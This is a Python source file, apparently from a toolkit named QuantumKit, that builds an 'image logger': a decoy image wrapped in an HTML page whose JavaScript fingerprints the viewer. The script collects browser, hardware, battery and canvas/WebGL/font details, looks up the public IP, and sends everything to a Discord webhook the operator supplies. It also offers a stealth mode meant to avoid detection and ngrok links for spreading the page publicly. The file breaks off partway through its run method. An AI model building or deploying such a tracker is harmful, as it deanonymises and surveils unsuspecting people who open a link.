#!/usr/bin/env python3
"""
Universal Image Logger - All-in-One Image Logger
Part of QuantumKit v6.0
Combines all image logging functionality into one tool
"""
import os
import sys
import time
import random
import string
import requests
import threading
import socket
import webbrowser
from datetime import datetime
from src.utils import ui
from colorama import Fore, Style, init
from PIL import Image, ImageDraw, ImageFont
import io
from http.server import HTTPServer, SimpleHTTPRequestHandler
import urllib.parse

init(autoreset=True)

class UniversalImageLogger:
    def __init__(self):
        self.webhook_url = ""
        self.image_name = ""
        self.output_dir = "generated_images"
        self.image_type = "gif"
        self.image_size = (400, 300)
        self.collect_system_info = True
        self.collect_browser_info = True
        self.collect_network_info = True
        self.collect_hardware_info = True
        self.collect_fingerprint_info = True
        self.stealth_mode = False
        self.custom_message = ""
        self.trigger_on_load = True
        self.trigger_on_click = False
        self.use_ngrok = True
        self.local_port = 4040
        self.server_thread = None
        self.server = None
        self.logger_type = "local"  # local, pro
        self.censored_text = "||SPOILER||"
        self.embed_js_in_image = False

    def print_banner(self):
        """Выводит баннер"""
        os.system('cls' if os.name == 'nt' else 'clear')
        banner = f"""
{Fore.MAGENTA} ██▓ ███▄ ▄███▓  ▄████     ██▓     ▒█████    ▄████   ▄████ ▓█████  ██▀███  
{Fore.MAGENTA}▓██▒▓██▒▀█▀ ██▒ ██▒ ▀█▒   ▓██▒    ▒██▒  ██▒ ██▒ ▀█▒ ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒
{Fore.MAGENTA}▒██▒▓██    ▓██░▒██░▄▄▄░   ▒██░    ▒██░  ██▒▒██░▄▄▄░▒██░▄▄▄░▒███   ▓██ ░▄█ ▒
{Fore.MAGENTA}░██░▒██    ▒██ ░▓█  ██▓   ▒██░    ▒██   ██░░▓█  ██▓░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄  
{Fore.MAGENTA}░██░▒██▒   ░██▒░▒▓███▀▒   ░██████▒░ ████▓▒░░▒▓███▀▒░▒▓███▀▒░▒████▒░██▓ ▒██▒
{Fore.MAGENTA}░▓  ░ ▒░   ░  ░ ░▒   ▒    ░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒  ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
{Fore.MAGENTA} ▒ ░░  ░      ░  ░   ░    ░ ░ ▒  ░  ░ ▒ ▒░   ░   ░   ░   ░  ░ ░  ░  ░▒ ░ ▒░
{Fore.MAGENTA} ▒ ░░      ░   ░ ░   ░      ░ ░   ░ ░ ░ ▒  ░ ░   ░ ░ ░   ░    ░     ░░   ░ 
{Fore.MAGENTA} ░         ░         ░        ░  ░    ░ ░        ░       ░    ░  ░   ░     
{Fore.MAGENTA}                                                                           
"""
        print(banner)
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║                        UNIVERSAL IMAGE LOGGER v1.0                          ║")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════════════════════╝\n")

    def get_user_input(self):
        """Получает настройки от пользователя"""
        print(f"{Fore.CYAN}[*] Universal Image Logger Configuration")
        print(f"{Fore.CYAN}[*] ======================================")
        
        # Discord Webhook
        while True:
            webhook = input(f"{Fore.YELLOW}[?] Enter Discord webhook URL: ").strip()
            if webhook:
                if webhook.startswith('https://discord.com/api/webhooks/'):
                    self.webhook_url = webhook
                    break
                else:
                    print(f"{Fore.RED}[!] Invalid Discord webhook URL!")
            else:
                print(f"{Fore.RED}[!] Webhook URL cannot be empty!")

        # Имя изображения
        while True:
            name = input(f"{Fore.YELLOW}[?] Enter image name (without extension): ").strip()
            if name:
                self.image_name = name
                break
            else:
                print(f"{Fore.RED}[!] Image name cannot be empty!")

        # Тип логгера
        print(f"\n{Fore.YELLOW}[*] Logger Type:")
        print(f"{Fore.WHITE}    1. Local Image Logger (HTML + Image)")
        print(f"{Fore.WHITE}    2. Image Logger Pro (Real images with JS)")
        
        while True:
            try:
                choice = input(f"\n{Fore.YELLOW}[?] Enter choice (1-2): ").strip()
                if choice == '1':
                    self.logger_type = "local"
                    break
                elif choice == '2':
                    self.logger_type = "pro"
                    break
                else:
                    print(f"{Fore.RED}[!] Invalid choice. Please enter 1-2.")
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Operation cancelled")
                return False

        # Тип изображения
        print(f"\n{Fore.YELLOW}[*] Image Type:")
        print(f"{Fore.WHITE}    1. GIF (recommended - supports animation)")
        print(f"{Fore.WHITE}    2. PNG (high quality, supports transparency)")
        print(f"{Fore.WHITE}    3. JPG (smaller size)")
        
        while True:
            try:
                choice = input(f"\n{Fore.YELLOW}[?] Enter choice (1-3): ").strip()
                if choice == '1':
                    self.image_type = "gif"
                    break
                elif choice == '2':
                    self.image_type = "png"
                    break
                elif choice == '3':
                    self.image_type = "jpg"
                    break
                else:
                    print(f"{Fore.RED}[!] Invalid choice. Please enter 1-3.")
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Operation cancelled")
                return False

        # Размер изображения
        print(f"\n{Fore.YELLOW}[*] Image Size:")
        print(f"{Fore.WHITE}    1. Small (300x200)")
        print(f"{Fore.WHITE}    2. Medium (400x300) - recommended")
        print(f"{Fore.WHITE}    3. Large (600x400)")
        print(f"{Fore.WHITE}    4. Custom size")
        
        while True:
            try:
                size_choice = input(f"\n{Fore.YELLOW}[?] Enter choice (1-4): ").strip()
                if size_choice == '1':
                    self.image_size = (300, 200)
                    break
                elif size_choice == '2':
                    self.image_size = (400, 300)
                    break
                elif size_choice == '3':
                    self.image_size = (600, 400)
                    break
                elif size_choice == '4':
                    try:
                        width = int(input(f"{Fore.YELLOW}[?] Enter width: "))
                        height = int(input(f"{Fore.YELLOW}[?] Enter height: "))
                        if width > 0 and height > 0:
                            self.image_size = (width, height)
                            break
                        else:
                            print(f"{Fore.RED}[!] Dimensions must be positive!")
                    except ValueError:
                        print(f"{Fore.RED}[!] Invalid dimensions!")
                else:
                    print(f"{Fore.RED}[!] Invalid choice. Please enter 1-4.")
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Operation cancelled")
                return False

        # Метод доступа
        print(f"\n{Fore.YELLOW}[*] Access Method:")
        print(f"{Fore.WHITE}    1. Ngrok (recommended - public URL)")
        print(f"{Fore.WHITE}    2. Local HTTP server (localhost only)")
        print(f"{Fore.WHITE}    3. Direct file access")
        
        while True:
            try:
                access_choice = input(f"\n{Fore.YELLOW}[?] Enter choice (1-3): ").strip()
                if access_choice == '1':
                    self.use_ngrok = True
                    break
                elif access_choice == '2':
                    self.use_ngrok = False
                    break
                elif access_choice == '3':
                    self.use_ngrok = False
                    print(f"{Fore.YELLOW}[*] Direct file access selected - files will be saved locally")
                    break
                else:
                    print(f"{Fore.RED}[!] Invalid choice. Please enter 1-3.")
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Operation cancelled")
                return False

        # Порт для локального сервера
        if not self.use_ngrok and access_choice != '3':
            try:
                port_input = input(f"{Fore.YELLOW}[?] Enter port for local server (default 4040): ").strip()
                if port_input:
                    self.local_port = int(port_input)
                else:
                    self.local_port = 4040
            except ValueError:
                print(f"{Fore.RED}[!] Invalid port, using default 4040")
                self.local_port = 4040

        # Тип триггера
        print(f"\n{Fore.YELLOW}[*] Trigger Settings:")
        print(f"{Fore.WHITE}    1. Trigger on image load (recommended)")
        print(f"{Fore.WHITE}    2. Trigger on image click")
        print(f"{Fore.WHITE}    3. Both triggers")
        
        while True:
            try:
                choice = input(f"\n{Fore.YELLOW}[?] Enter choice (1-3): ").strip()
                if choice == '1':
                    self.trigger_on_load = True
                    self.trigger_on_click = False
                    break
                elif choice == '2':
                    self.trigger_on_load = False
                    self.trigger_on_click = True
                    break
                elif choice == '3':
                    self.trigger_on_load = True
                    self.trigger_on_click = True
                    break
                else:
                    print(f"{Fore.RED}[!] Invalid choice. Please enter 1-3.")
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Operation cancelled")
                return False

        # Настройки сбора данных
        print(f"\n{Fore.YELLOW}[*] Data Collection Settings:")
        
        system_input = input(f"{Fore.YELLOW}[?] Collect system information? (y/n, default y): ").strip().lower()
        self.collect_system_info = system_input != 'n'
        
        browser_input = input(f"{Fore.YELLOW}[?] Collect browser information? (y/n, default y): ").strip().lower()
        self.collect_browser_info = browser_input != 'n'
        
        network_input = input(f"{Fore.YELLOW}[?] Collect network information? (y/n, default y): ").strip().lower()
        self.collect_network_info = network_input != 'n'
        
        hardware_input = input(f"{Fore.YELLOW}[?] Collect hardware information? (y/n, default y): ").strip().lower()
        self.collect_hardware_info = hardware_input != 'n'
        
        fingerprint_input = input(f"{Fore.YELLOW}[?] Collect fingerprint information? (y/n, default y): ").strip().lower()
        self.collect_fingerprint_info = fingerprint_input != 'n'

        # Скрытный режим
        stealth_input = input(f"{Fore.YELLOW}[?] Enable stealth mode (minimal detection)? (y/n, default n): ").strip().lower()
        self.stealth_mode = stealth_input == 'y'

        # Пользовательское сообщение
        custom_msg = input(f"{Fore.YELLOW}[?] Custom message (optional): ").strip()
        self.custom_message = custom_msg

        # Дополнительные настройки для разных типов
        if self.logger_type == "pro":
            embed_js = input(f"{Fore.YELLOW}[?] Embed JavaScript in image metadata? (y/n, default n): ").strip().lower()
            self.embed_js_in_image = embed_js == 'y'

        return True

    def generate_random_filename(self):
        """Генерирует случайное имя файла"""
        timestamp = int(time.time())
        random_suffix = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        return f"{self.image_name}_{random_suffix}.{self.image_type}"

    def create_animated_gif(self, filename):
        """Создает анимированный GIF"""
        os.makedirs(self.output_dir, exist_ok=True)
        filepath = os.path.join(self.output_dir, filename)
        
        # Создаем несколько кадров для анимации
        frames = []
        colors = [
            (255, 0, 0),    # Красный
            (0, 255, 0),    # Зеленый
            (0, 0, 255),    # Синий
            (255, 255, 0),  # Желтый
            (255, 0, 255),  # Пурпурный
            (0, 255, 255),  # Голубой
            (255, 165, 0),  # Оранжевый
            (128, 0, 128)   # Фиолетовый
        ]
        
        width, height = self.image_size
        
        for i in range(8):  # 8 кадров анимации
            # Создаем изображение
            img = Image.new('RGB', (width, height), colors[i])
            draw = ImageDraw.Draw(img)
            
            # Добавляем текст
            try:
                font = ImageFont.truetype("arial.ttf", 24)
            except:
                font = ImageFont.load_default()
            
            text = f"Universal Image Logger"
            text_bbox = draw.textbbox((0, 0), text, font=font)
            text_width = text_bbox[2] - text_bbox[0]
            text_height = text_bbox[3] - text_bbox[1]
            
            x = (width - text_width) // 2
            y = (height - text_height) // 2
            
            # Рисуем фон для текста
            draw.rectangle([x-10, y-10, x+text_width+10, y+text_height+10], fill=(0, 0, 0))
            draw.text((x, y), text, fill=(255, 255, 255), font=font)
            
            # Добавляем номер кадра
            frame_text = f"Frame {i+1}/8"
            draw.text((10, 10), frame_text, fill=(255, 255, 255), font=font)
            
            frames.append(img)
        
        # Сохраняем как GIF
        frames[0].save(
            filepath,
            save_all=True,
            append_images=frames[1:],
            duration=500,  # 500ms между кадрами
            loop=0  # Бесконечный цикл
        )
        
        return filepath

    def create_static_image(self, filename):
        """Создает статическое изображение (PNG/JPG)"""
        os.makedirs(self.output_dir, exist_ok=True)
        filepath = os.path.join(self.output_dir, filename)
        
        width, height = self.image_size
        
        # Создаем градиентный фон
        img = Image.new('RGB', (width, height))
        draw = ImageDraw.Draw(img)
        
        # Создаем градиент
        for y in range(height):
            r = int(255 * (1 - y / height))
            g = int(128 * (y / height))
            b = int(255 * (y / height))
            draw.line([(0, y), (width, y)], fill=(r, g, b))
        
        # Добавляем текст
        try:
            font = ImageFont.truetype("arial.ttf", 28)
        except:
            font = ImageFont.load_default()
        
        text = "Universal Image Logger"
        text_bbox = draw.textbbox((0, 0), text, font=font)
        text_width = text_bbox[2] - text_bbox[0]
        text_height = text_bbox[3] - text_bbox[1]
        
        x = (width - text_width) // 2
        y = (height - text_height) // 2
        
        # Рисуем фон для текста
        draw.rectangle([x-15, y-15, x+text_width+15, y+text_height+15], fill=(0, 0, 0, 128))
        draw.text((x, y), text, fill=(255, 255, 255), font=font)
        
        # Добавляем подзаголовок
        subtitle = "All-in-One Image Logger"
        subtitle_bbox = draw.textbbox((0, 0), subtitle, font=font)
        subtitle_width = subtitle_bbox[2] - subtitle_bbox[0]
        subtitle_x = (width - subtitle_width) // 2
        subtitle_y = y + text_height + 10
        
        draw.rectangle([subtitle_x-10, subtitle_y-5, subtitle_x+subtitle_width+10, subtitle_y+text_height+5], fill=(0, 0, 0, 128))
        draw.text((subtitle_x, subtitle_y), subtitle, fill=(200, 200, 200), font=font)
        
        # Сохраняем изображение
        if self.image_type == "png":
            img.save(filepath, "PNG")
        else:  # jpg
            img.save(filepath, "JPEG", quality=95)
        
        return filepath

    def generate_javascript_payload(self):
        """Генерирует JavaScript payload для всех типов логгеров"""
        js_code = f"""
        // Universal Image Logger - JavaScript Payload
        (function() {{
            const webhookUrl = '{self.webhook_url}';
            const stealthMode = {str(self.stealth_mode).lower()};
            const triggerOnLoad = {str(self.trigger_on_load).lower()};
            const triggerOnClick = {str(self.trigger_on_click).lower()};
            let dataCollected = false;
            
            // Collect comprehensive system information
            function collectSystemInfo() {{
                const info = {{
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    referrer: document.referrer,
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    languages: navigator.languages,
                    cookieEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    onLine: navigator.onLine,
                    javaEnabled: navigator.javaEnabled(),
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory,
                    maxTouchPoints: navigator.maxTouchPoints,
                    platform: navigator.platform,
                    vendor: navigator.vendor,
                    appName: navigator.appName,
                    appVersion: navigator.appVersion,
                    appCodeName: navigator.appCodeName,
                    product: navigator.product,
                    productSub: navigator.productSub,
                    triggerType: 'universal_image_logger',
                    loggerType: '{self.logger_type}'
                }};

                // Screen information
                if (window.screen) {{
                    info.screen = {{
                        width: screen.width,
                        height: screen.height,
                        availWidth: screen.availWidth,
                        availHeight: screen.availHeight,
                        colorDepth: screen.colorDepth,
                        pixelDepth: screen.pixelDepth,
                        orientation: screen.orientation ? screen.orientation.type : 'unknown'
                    }};
                }}

                // Window information
                if (window.innerWidth) {{
                    info.window = {{
                        innerWidth: window.innerWidth,
                        innerHeight: window.innerHeight,
                        outerWidth: window.outerWidth,
                        outerHeight: window.outerHeight,
                        devicePixelRatio: window.devicePixelRatio
                    }};
                }}

                // Battery information
                if (navigator.getBattery) {{
                    navigator.getBattery().then(battery => {{
                        info.battery = {{
                            charging: battery.charging,
                            level: battery.level,
                            chargingTime: battery.chargingTime,
                            dischargingTime: battery.dischargingTime
                        }};
                        sendData(info);
                    }}).catch(() => {{
                        sendData(info);
                    }});
                }} else {{
                    sendData(info);
                }}

                return info;
            }}

            // Collect browser fingerprinting information
            function collectFingerprintInfo() {{
                const fingerprint = {{}};

                // Canvas fingerprinting
                try {{
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    ctx.textBaseline = 'top';
                    ctx.font = '14px Arial';
                    ctx.fillText('Canvas fingerprinting test', 2, 2);
                    fingerprint.canvas = canvas.toDataURL();
                }} catch (e) {{
                    fingerprint.canvas = 'error';
                }}

                // WebGL fingerprinting
                try {{
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (gl) {{
                        fingerprint.webgl = {{
                            vendor: gl.getParameter(gl.VENDOR),
                            renderer: gl.getParameter(gl.RENDERER),
                            version: gl.getParameter(gl.VERSION),
                            extensions: gl.getSupportedExtensions()
                        }};
                    }}
                }} catch (e) {{
                    fingerprint.webgl = 'error';
                }}

                // Font fingerprinting
                try {{
                    const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'];
                    const testString = 'mmmmmmmmmmlli';
                    const testSize = '72px';
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    const defaultWidth = {{}};
                    const defaultHeight = {{}};

                    for (let i = 0; i < fonts.length; i++) {{
                        ctx.font = testSize + ' ' + fonts[i];
                        defaultWidth[fonts[i]] = ctx.measureText(testString).width;
                        defaultHeight[fonts[i]] = testSize;
                    }}

                    fingerprint.fonts = defaultWidth;
                }} catch (e) {{
                    fingerprint.fonts = 'error';
                }}

                // Plugin information
                try {{
                    fingerprint.plugins = [];
                    for (let i = 0; i < navigator.plugins.length; i++) {{
                        const plugin = navigator.plugins[i];
                        fingerprint.plugins.push({{
                            name: plugin.name,
                            description: plugin.description,
                            filename: plugin.filename
                        }});
                    }}
                }} catch (e) {{
                    fingerprint.plugins = 'error';
                }}

                // MIME types
                try {{
                    fingerprint.mimeTypes = [];
                    for (let i = 0; i < navigator.mimeTypes.length; i++) {{
                        const mimeType = navigator.mimeTypes[i];
                        fingerprint.mimeTypes.push({{
                            type: mimeType.type,
                            description: mimeType.description,
                            suffixes: mimeType.suffixes
                        }});
                    }}
                }} catch (e) {{
                    fingerprint.mimeTypes = 'error';
                }}

                return fingerprint;
            }}

            // Collect network information
            function collectNetworkInfo() {{
                const network = {{}};

                // Connection information
                if (navigator.connection) {{
                    network.connection = {{
                        effectiveType: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink,
                        rtt: navigator.connection.rtt,
                        saveData: navigator.connection.saveData
                    }};
                }}

                // IP address (if available through external service)
                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {{
                        network.publicIP = data.ip;
                        sendData({{network: network}});
                    }})
                    .catch(() => {{
                        sendData({{network: network}});
                    }});

                return network;
            }}

            // Send data to Discord webhook
            function sendData(data) {{
                if (dataCollected) return; // Prevent multiple sends
                dataCollected = true;
                
                const payload = {{
                    embeds: [{{
                        title: '🖼️ Universal Image Logger - Data Collected',
                        description: 'Someone viewed a universal image!',
                        color: 0xff6600,
                        fields: [],
                        timestamp: new Date().toISOString(),
                        footer: {{
                            text: 'QuantumKit v6.0 - Universal Image Logger'
                        }}
                    }}]
                }};

                // Add custom message if provided
                if ('{self.custom_message}') {{
                    payload.embeds[0].description = '{self.custom_message}';
                }}

                // Add system information
                if (data.screen) {{
                    payload.embeds[0].fields.push({{
                        name: '🖥️ Screen Info',
                        value: `Resolution: ${{data.screen.width}}x${{data.screen.height}}\\nColor Depth: ${{data.screen.colorDepth}}\\nPixel Depth: ${{data.screen.pixelDepth}}`,
                        inline: true
                    }});
                }}

                if (data.window) {{
                    payload.embeds[0].fields.push({{
                        name: '🪟 Window Info',
                        value: `Size: ${{data.window.innerWidth}}x${{data.window.innerHeight}}\\nDevice Pixel Ratio: ${{data.window.devicePixelRatio}}`,
                        inline: true
                    }});
                }}

                if (data.battery) {{
                    payload.embeds[0].fields.push({{
                        name: '🔋 Battery Info',
                        value: `Level: ${{Math.round(data.battery.level * 100)}}%\\nCharging: ${{data.battery.charging ? 'Yes' : 'No'}}`,
                        inline: true
                    }});
                }}

                // Add user agent
                payload.embeds[0].fields.push({{
                    name: '🌐 User Agent',
                    value: data.userAgent.substring(0, 1024),
                    inline: false
                }});

                // Add URL information
                payload.embeds[0].fields.push({{
                    name: '🔗 URL Info',
                    value: `URL: ${{data.url}}\\nReferrer: ${{data.referrer || 'None'}}`,
                    inline: false
                }});

                // Add trigger information
                payload.embeds[0].fields.push({{
                    name: '🎯 Trigger Info',
                    value: `Type: ${{data.triggerType}}\\nLogger Type: ${{data.loggerType}}\\nImage Type: {self.image_type.upper()}\\nImage Size: {self.image_size[0]}x{self.image_size[1]}`,
                    inline: true
                }});

                // Add fingerprint information if collected
                if (data.fingerprint) {{
                    payload.embeds[0].fields.push({{
                        name: '👆 Fingerprint',
                        value: `Canvas: ${{data.fingerprint.canvas ? 'Available' : 'Not available'}}\\nWebGL: ${{data.fingerprint.webgl ? 'Available' : 'Not available'}}\\nFonts: ${{data.fingerprint.fonts ? 'Available' : 'Not available'}}`,
                        inline: true
                    }});
                }}

                // Add network information
                if (data.network) {{
                    let networkInfo = '';
                    if (data.network.publicIP) {{
                        networkInfo += `Public IP: ${{data.network.publicIP}}\\n`;
                    }}
                    if (data.network.connection) {{
                        networkInfo += `Connection: ${{data.network.connection.effectiveType}}\\nDownlink: ${{data.network.connection.downlink}} Mbps`;
                    }}
                    if (networkInfo) {{
                        payload.embeds[0].fields.push({{
                            name: '🌐 Network Info',
                            value: networkInfo,
                            inline: true
                        }});
                    }}
                }}

                // Send to Discord webhook
                fetch(webhookUrl, {{
                    method: 'POST',
                    headers: {{
                        'Content-Type': 'application/json'
                    }},
                    body: JSON.stringify(payload)
                }}).catch(error => {{
                    console.error('Failed to send data:', error);
                }});
            }}

            // Handle image load
            function handleImageLoad() {{
                if (triggerOnLoad) {{
                    const systemInfo = collectSystemInfo();
                    const fingerprintInfo = collectFingerprintInfo();
                    const networkInfo = collectNetworkInfo();

                    const allData = {{
                        ...systemInfo,
                        fingerprint: fingerprintInfo,
                        network: networkInfo
                    }};

                    setTimeout(() => {{
                        sendData(allData);
                    }}, 1000);
                }}
            }}

            // Handle image click
            function handleImageClick() {{
                if (triggerOnClick) {{
                    const systemInfo = collectSystemInfo();
                    const fingerprintInfo = collectFingerprintInfo();
                    const networkInfo = collectNetworkInfo();

                    const allData = {{
                        ...systemInfo,
                        fingerprint: fingerprintInfo,
                        network: networkInfo
                    }};

                    setTimeout(() => {{
                        sendData(allData);
                    }}, 500);
                }}
            }}

            // Set up event listeners
            if (triggerOnLoad) {{
                window.addEventListener('load', handleImageLoad);
            }}

            if (triggerOnClick) {{
                const trackedImage = document.getElementById('trackedImage');
                if (trackedImage) {{
                    trackedImage.addEventListener('click', handleImageClick);
                }}
            }}

            // Execute with stealth mode consideration
            if (stealthMode) {{
                // Add random delay to avoid detection
                setTimeout(() => {{
                    if (triggerOnLoad) handleImageLoad();
                }}, Math.random() * 5000 + 2000);
            }}
        }})();
        """
        return js_code 

    def create_local_html(self, image_filename):
        """Создает HTML для Local Image Logger"""
        html_filename = f"{image_filename.replace('.', '_')}.html"
        html_filepath = os.path.join(self.output_dir, html_filename)
        
        os.makedirs(self.output_dir, exist_ok=True)
        
        print(f"{Fore.CYAN}[*] Creating Local Image Logger HTML: {html_filename}")
        
        js_payload = self.generate_javascript_payload()
        
        html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Universal Image Logger</title>
    <style>
        body {{
            margin: 0;
            padding: 20px;
            background: #1a1a1a;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }}
        .container {{
            text-align: center;
            max-width: 800px;
        }}
        .image-container {{
            margin: 20px 0;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
        }}
        .image-container img {{
            max-width: 100%;
            height: auto;
            display: block;
        }}
        .info {{
            background: #4444ff;
            color: white;
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
        }}
        .warning {{
            background: #ff4444;
            color: white;
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            font-weight: bold;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🖼️ Universal Image Logger</h1>
        
        <div class="warning">
            ⚠️ This image contains tracking code!
        </div>
        
        <div class="image-container">
            <img src="{image_filename}" alt="Universal Image Logger" id="trackedImage">
        </div>
        
        <div class="info">
            💡 This image will collect system information when viewed
        </div>
        
        <p>Universal Image Logger - All-in-One Solution</p>
    </div>

    <script>
        {js_payload}
    </script>
</body>
</html>"""
        
        with open(html_filepath, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        if os.path.exists(html_filepath):
            print(f"{Fore.GREEN}[+] Local HTML created successfully: {os.path.getsize(html_filepath)} bytes")
        else:
            print(f"{Fore.RED}[!] Warning: Local HTML not created at {html_filepath}")
        
        return html_filepath



    def start_local_server(self):
        """Запускает локальный HTTP сервер"""
        try:
            output_dir = self.output_dir
            
            class CustomHTTPRequestHandler(SimpleHTTPRequestHandler):
                def __init__(self, *args, **kwargs):
                    os.chdir(os.path.abspath(output_dir))
                    super().__init__(*args, **kwargs)
                
                def log_message(self, format, *args):
                    pass
                
                def end_headers(self):
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
                    self.send_header('Access-Control-Allow-Headers', 'Content-Type')
                    super().end_headers()
                
                def do_GET(self):
                    try:
                        if self.path == '/favicon.ico':
                            self.send_response(204)
                            self.end_headers()
                            return
                        
                        if self.path == '/':
                            self.path = '/index.html'
                        
                        file_path = os.path.join(os.getcwd(), self.path.lstrip('/'))
                        print(f"{Fore.CYAN}[*] Requested file: {self.path}")
                        print(f"{Fore.CYAN}[*] Full path: {file_path}")
                        print(f"{Fore.CYAN}[*] File exists: {os.path.exists(file_path)}")
                        
                        if not os.path.exists(file_path):
                            print(f"{Fore.RED}[!] File not found: {file_path}")
                            self.send_response(404)
                            self.end_headers()
                            return
                        
                        super().do_GET()
                        
                    except ConnectionAbortedError:
                        pass
                    except BrokenPipeError:
                        pass
                    except Exception as e:
                        print(f"{Fore.RED}[!] Server error: {e}")
                        try:
                            self.send_response(500)
                            self.end_headers()
                        except:
                            pass

            try:
                test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                test_socket.settimeout(1)
                result = test_socket.connect_ex(('localhost', self.local_port))
                test_socket.close()
                if result == 0:
                    print(f"{Fore.YELLOW}[!] Port {self.local_port} is already in use")
                    print(f"{Fore.YELLOW}[*] Trying to use existing server...")
                    return True
            except:
                pass

            if self.server:
                try:
                    self.server.shutdown()
                    self.server.server_close()
                except:
                    pass
            
            self.server = HTTPServer(('0.0.0.0', self.local_port), CustomHTTPRequestHandler)
            self.server_thread = threading.Thread(target=self.server.serve_forever)
            self.server_thread.daemon = True
            self.server_thread.start()
            
            time.sleep(2)
            
            for attempt in range(3):
                try:
                    response = requests.get(f'http://localhost:{self.local_port}/', timeout=5)
                    if response.status_code == 200 or response.status_code == 404:
                        print(f"{Fore.GREEN}[+] Local HTTP server started successfully on port {self.local_port}")
                        return True
                    else:
                        print(f"{Fore.YELLOW}[!] Server test attempt {attempt + 1}: {response.status_code}")
                except requests.exceptions.ConnectionError:
                    print(f"{Fore.YELLOW}[!] Server test attempt {attempt + 1}: Connection refused (server may still be starting)")
                except Exception as e:
                    print(f"{Fore.YELLOW}[!] Server test attempt {attempt + 1} failed: {e}")
                
                if attempt < 2:
                    time.sleep(1)
            
            print(f"{Fore.YELLOW}[!] Server may not be fully ready, but continuing...")
            return True
            
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to start local server: {e}")
            return False

    def create_index_html(self):
        """Создает index.html файл для корневого пути"""
        index_path = os.path.join(self.output_dir, 'index.html')
        index_content = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Universal Image Logger - Server Running</title>
    <style>
        body {
            margin: 0;
            padding: 20px;
            background: #1a1a1a;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            text-align: center;
            max-width: 600px;
        }
        .success {
            background: #44ff44;
            color: black;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            font-weight: bold;
        }
        .info {
            background: #4444ff;
            color: white;
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🖼️ Universal Image Logger</h1>
        
        <div class="success">
            ✅ Server is running successfully!
        </div>
        
        <div class="info">
            💡 The local HTTP server is working properly.
            <br>You can now use ngrok to create a public URL.
        </div>
        
        <p>Universal Image Logger - Server Status: ONLINE</p>
    </div>
</body>
</html>"""
        
        with open(index_path, 'w', encoding='utf-8') as f:
            f.write(index_content)
        
        return index_path

    def get_ngrok_url(self):
        """Получает ngrok URL"""
        try:
            response = requests.get('http://localhost:4040/api/tunnels', timeout=5)
            if response.status_code == 200:
                tunnels = response.json()['tunnels']
                if tunnels:
                    return tunnels[0]['public_url']
        except:
            pass
        return None

    def test_webhook(self):
        """Тестирует Discord webhook"""
        try:
            test_payload = {
                "embeds": [{
                    "title": "🖼️ Universal Image Logger - Test",
                    "description": "Webhook test successful!",
                    "color": 0xff6600,
                    "timestamp": datetime.now().isoformat(),
                    "footer": {
                        "text": "QuantumKit v6.0 - Universal Image Logger"
                    }
                }]
            }
            
            response = requests.post(self.webhook_url, json=test_payload, timeout=10)
            
            if response.status_code == 204:
                print(f"{Fore.GREEN}[+] Webhook test successful!")
                return True
            else:
                print(f"{Fore.RED}[!] Webhook test failed: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"{Fore.RED}[!] Webhook test error: {e}")
            return False

    def run(self):
        """Основной метод запуска"""
        try:
            print(f"{Fore.CYAN}[*] Generating universal image logger...")
            
            if not self.test_webhook():
                print(f"{Fore.YELLOW}[!] Webhook test failed, but continuing...")
            
            filename = self.generate_random_filename()
            
            if self.image_type == "gif":
                filepath = self.create_animated_gif(filename)
            else:
                filepath = self.create_static_image(filename)
            
            print(f"{Fore.GREEN}[+] Image created successfully!")
            print(f"{Fore.CYAN}[*] File: {filepath}")
            print(f"{Fore.CYAN}[*] Filename: {filename}")
            
            if os.path.exists(filepath):
                print(f"{Fore.GREEN}[+] Image file verified: {os.path.getsize(filepath)} bytes")
            else:
                print(f"{Fore.RED}[!] Warning: Image file not found at {filepath}")
            
            # Создаем HTML в зависимости от типа логгера
